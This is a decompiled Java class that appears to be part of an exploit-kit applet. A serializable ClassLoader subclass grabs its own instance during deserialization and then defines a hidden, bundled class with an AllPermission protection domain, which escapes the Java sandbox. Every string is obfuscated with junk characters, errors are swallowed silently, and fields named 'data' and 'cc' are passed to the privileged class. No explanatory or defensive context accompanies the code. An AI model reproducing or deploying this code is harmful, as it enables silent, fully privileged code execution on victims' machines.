// 
// Decompiled by Procyon v0.5.30
// 

package ghsdr;

import java.lang.reflect.Field;
import java.security.PermissionCollection;
import java.security.ProtectionDomain;
import java.security.CodeSource;
import java.security.Permission;
import java.security.AllPermission;
import java.security.Permissions;
import java.security.cert.Certificate;
import java.net.URL;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.io.Serializable;

public class Gedsrdc extends ClassLoader implements Serializable
{
    private static final long serialVersionUID = 6812622870313961944L;
    public static Gedsrdc instance;
    
    private void writeObject(final ObjectOutputStream objectOutputStream) throws IOException, ClassNotFoundException {
        objectOutputStream.defaultWriteObject();
    }
    
    private void readObject(final ObjectInputStream objectInputStream) throws IOException, ClassNotFoundException {
        Gedsrdc.instance = this;
        objectInputStream.defaultReadObject();
    }
    
    public void __L(final String s, final String s2) throws IOException {
        try {
            final ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            final byte[] array = new byte[8192];
            int read;
            while ((read = this.getClass().getResourceAsStream("/TTTT".replace("T", "") + "ghsvdr".replace("v", "").replace('.', '/') + "/55K55G5555we5555d5555s5555d555555v.c5las555s".replace("5", "")).read(array)) > 0) {
                byteArrayOutputStream.write(array, 0, read);
            }
            final byte[] byteArray = byteArrayOutputStream.toByteArray();
            final URL url = new URL("xxxfixlxxxxxxe:/xxxxx//x".replace("x", ""));
            final Certificate[] array2 = new Certificate[0];
            final Permissions permissions = new Permissions();
            permissions.add(new AllPermission());
            final Class<?> defineClass = this.defineClass("gYhsdr.YKYYYGwYYedYYYYsdv".replace("Y", ""), byteArray, 0, byteArray.length, new ProtectionDomain(new CodeSource(url, array2), permissions));
            if (defineClass != null) {
                final Field field = defineClass.getField("NNdatNNa".replace("N", ""));
                final Field field2 = defineClass.getField("czzzzzzzc".replace("z", ""));
                final Object instance = defineClass.newInstance();
                field.set(instance, s);
                field2.set(instance, s2);
                defineClass.newInstance();
            }
        }
        catch (Exception ex) {}
    }
    
    static {
        Gedsrdc.instance = null;
    }
}
